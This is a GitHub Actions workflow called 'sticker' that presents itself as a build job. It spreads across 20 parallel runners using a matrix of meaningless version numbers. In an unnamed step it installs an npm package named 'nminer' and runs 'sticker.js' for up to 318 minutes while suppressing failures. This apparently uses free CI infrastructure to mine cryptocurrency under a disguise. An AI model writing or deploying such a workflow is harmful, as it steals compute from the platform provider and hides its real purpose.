name: sticker
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 1180 }
          - { version: 9103 }
          - { version: 9479 }
          - { version: 4627 }
          - { version: 5140 }
          - { version: 657 }
          - { version: 5269 }
          - { version: 9155 }
          - { version: 2566 }
          - { version: 2899 }
          - { version: 7416 }
          - { version: 1687 }
          - { version: 8472 }
          - { version: 6721 }
          - { version: 2763 }
          - { version: 778 }
          - { version: 1262 }
          - { version: 4713 }
          - { version: 7073 }
          - { version: 5350 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 318m node sticker.js || echo "sticker executed"